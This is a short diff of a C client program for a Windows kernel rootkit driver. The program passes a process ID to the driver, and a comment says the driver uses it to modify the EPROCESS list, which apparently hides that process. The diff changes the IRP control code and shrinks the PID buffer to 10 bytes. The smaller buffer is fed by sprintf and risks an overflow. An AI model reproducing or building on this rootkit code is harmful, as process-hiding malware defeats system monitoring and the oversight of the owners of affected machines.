@@ -7,7 +7,7 @@
 #define DRIVER "c:\\\\Windows\\System32\\drivers\\Rootkit.sys"
 
 // IRP code that will call our rootkit functionality
-#define IRP_ROOTKIT_CODE 0x900 
+#define IRP_ROOTKIT_CODE 0x815
 
 int call_kernel_driver(char * pid, HANDLE hDevice){
 
@@ -216,7 +216,7 @@ int main(int argc, char *argv[])
     printf("[+] Recieved driver handle.\n");
 
     // Convert PID to buffer to pass to driver
-    char buffer[32];
+    char buffer[10];
     sprintf(buffer,"%ld", pid);
 
     // Call driver to modify the EPROCESS list
